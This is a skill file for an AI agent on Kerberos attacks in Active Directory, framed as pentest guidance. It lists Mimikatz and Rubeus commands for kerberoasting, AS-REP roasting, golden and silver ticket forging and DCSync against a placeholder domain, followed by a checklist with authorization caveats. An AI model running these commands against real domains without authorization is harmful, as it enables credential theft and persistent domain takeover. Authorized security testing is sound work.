---
name: kerberos-attacks-forge
description: "Use when performing Kerberos attacks in AD."
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [Kerberos, golden-ticket, silver-ticket, kerberoast, ASREP-roast, DCSync, AD]
    related_skills: [active-directory-pentesting, privilege-escalation-techniques, lateral-movement-pivoting, identity-access-management]
---

# Kerberos Attacks and Ticket Forging

Attacking Kerberos in Active Directory — from kerberoasting and AS-REP roasting through golden/silver ticket forging, DCSync, and delegation abuse.

## When to Use

- Extracting service account credentials via kerberoasting
- Forging tickets for domain persistence (golden/silver)
- Performing DCSync for KRBTGT hash extraction
- Abusing Kerberos delegation for privilege escalation

## Kerberos Attack Techniques

```python
KERBEROS_ATTACKS = {
    'kerberoasting': 'Request TGS for SPNs, crack service account hashes offline',
    'asrep_roasting': 'Request AS-REP for users without Kerberos pre-authentication',
    'golden_ticket': 'Forge TGT with KRBTGT hash — domain admin anywhere, any time',
    'silver_ticket': 'Forge TGS for specific service — access without domain admin',
    'diamond_ticket': 'Decrypt legitimate TGT, modify PAC, re-encrypt — stealthier than golden',
    'dcsync': 'Replicate domain controller (DRS protocol) — extract any hash including KRBTGT',
    'skeleton_key': 'Mimikatz skeleton key — backdoor all domain auth with password "mimikatz"',
    'dcom_lateral': 'Abuse Kerberos delegation for lateral movement',
}

# Mimikatz commands
MIKIKATZ_COMMANDS = {
    'kerberoast': 'kerberos::ask /target:HTTP/srv01.contoso.com',
    'golden_ticket': 'kerberos::golden /user:Administrator /domain:contoso.com /sid:S-1-5-21-... /krbtgt:HASH',
    'silver_ticket': 'kerberos::golden /user:Administrator /domain:contoso.com /sid:... /target:dc01.contoso.com /service:CIFS /rc4:HASH',
    'dcsync': 'lsadump::dcsync /domain:contoso.com /user:krbtgt',
}

# Rubeus commands (C# tool)
RUBEUS_COMMANDS = {
    'kerberoast': 'Rubeus.exe kerberoast /nowrap',
    'asreproast': 'Rubeus.exe asreproast /nowrap',
    'silver_ticket': 'Rubeus.exe silver /service:HTTP/server.contoso.com /rc4:HASH /user:admin',
}
```

## Verification Checklist

- [ ] Kerberoasting on all SPNs (authorized accounts only)
- [ ] AS-REP roasting on users without pre-auth
- [ ] Ticket hashes cracked offline (hashcat mode 13100, 18200)
- [ ] KRBTGT hash extracted via DCSync (authorized only)
- [ ] Golden ticket forged and tested (access any resource)
- [ ] Silver ticket forged for specific service access
- [ ] Delegation abuse checked (unconstrained, constrained, resource-based)
- [ ] Skeleton key demonstrated (if in scope)
- [ ] Cleanup: tickets purged, no permanent backdoors
